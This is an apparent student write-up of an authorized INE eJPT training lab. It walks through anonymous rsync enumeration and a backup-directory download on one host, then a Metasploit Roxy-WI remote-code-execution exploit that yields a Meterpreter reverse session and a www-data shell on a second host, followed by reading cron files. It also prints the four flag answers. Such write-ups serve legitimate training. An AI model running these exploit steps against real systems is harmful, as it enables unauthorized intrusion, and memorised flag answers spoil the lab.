# INE eJPT — Host & Network Penetration Testing: The Metasploit Framework CTF 2

**Course:** INE / eJPT — Host & Network Penetration Testing  
**Lab:** The Metasploit Framework CTF 2  
**Author:** Zeliha Zengin

---

## Lab Environment

GUI access to a Kali machine is provided. Two targets: `target1.ine.local` (192.218.99.3) and `target2.ine.local` (192.59.189.4). The target2 IP can change after a lab reset — re-identify it with Nmap before continuing.

- **Flag 1:** Enumerate the open rsync port and inspect its banner/modules.
- **Flag 2:** Explore the files in the rsync module to find the flag.
- **Flag 3:** Exploit the web app to gain a shell on `target2`.
- **Flag 4:** Investigate scheduled jobs for the hidden flag.

> **Note:** Flag format is `FLAG#_<MD5>` — submit only the hash, without the prefix.

**Tools used:** Nmap · Metasploit · rsync

> *All work is performed against an authorized INE training lab for eJPT exam preparation.*

## Flag 1 — rsync enumeration

Scan the target, then list the rsync modules exposed without authentication:

```bash
cat /etc/hosts
nmap -sV -Pn -A -sC -p- 192.218.99.3
rsync rsync://target1.ine.local/
```

> 🏁 **FLAG 1:** `40fce5d775ae44dabac8c9dada84a31a`

## Flag 2 — rsync module contents

The `backupwscohen` module is an exposed backup directory. Pull it down and read the files:

```bash
rsync -av rsync://192.218.99.3/backupwscohen ./backupwscohen
cd backupwscohen
ls
cat TPSData.txt
```

> 🏁 **FLAG 2:** `f734282a4f6049b0b6b44eea8a958534`

## Flag 3 — Roxy-WI RCE on target2

Scan `target2`, then use Metasploit's Roxy-WI module to land a Meterpreter session:

```bash
nmap -sV -Pn -A -sC -p- 192.59.189.4
msfconsole -q
search Roxy-WI
use 0
show options
set LHOST 192.59.189.2
set RHOSTS target2.ine.local
set TARGETURI /
exploit
```

Interact with the session, drop to a shell, and upgrade to an interactive shell as `www-data`:

```bash
getuid
sysinfo
shell
id
whoami
/bin/bash -i
cd /
cat flag.txt
```

> 🏁 **FLAG 3:** `c4eb1e396a784166b87848cf35f69f4e`

## Flag 4 — Cron jobs

Inspect the system crontab and cron directories; the flag lives in a cron definition file:

```bash
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/www-data-cron
```

> 🏁 **FLAG 4:** `ca39004c71fb48f49315c97856be6775`

## Summary

| Flag | Target | Technique |
| --- | --- | --- |
| 1 | target1 | Nmap + rsync module listing |
| 2 | target1 | `rsync -av` download of `backupwscohen` |
| 3 | target2 | Roxy-WI Metasploit exploit → Meterpreter |
| 4 | target2 | Cron job inspection (`/etc/cron.d`) |

### Key Takeaways

- An rsync daemon with anonymous modules leaks whole backup directories — always enumerate it.
- A known CVE in a web panel (Roxy-WI) maps straight to a Metasploit module.
- After a foothold, upgrade to an interactive shell with `/bin/bash -i`.
- Cron definitions (`/etc/crontab`, `/etc/cron.d/`) are a classic place to find loot and privesc paths.

---

*Write-up by Zeliha Zengin · eJPT preparation*